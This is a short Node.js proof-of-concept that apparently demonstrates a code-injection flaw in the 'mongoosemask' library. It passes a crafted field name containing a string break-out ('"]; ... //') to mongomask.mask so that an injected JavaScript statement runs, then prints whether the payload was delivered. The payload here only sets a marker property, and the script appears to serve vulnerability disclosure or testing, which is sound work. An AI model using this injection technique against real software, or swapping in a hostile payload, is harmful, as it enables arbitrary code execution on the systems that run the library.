
done = function done(){
    console.log("Done!");
};

var payload = 'console[\"my-awesome-prop-23-42\"] = 23;';
var mongomask = require('mongoosemask');
var obj = {};
var maskedModel = mongomask.mask(obj, [{_id:'"]; ' + payload + '//'}]);


if (console["my-awesome-prop-23-42"]){
    console.log("payload was delivered");
} else {
    console.log("payload NOT delivered");
}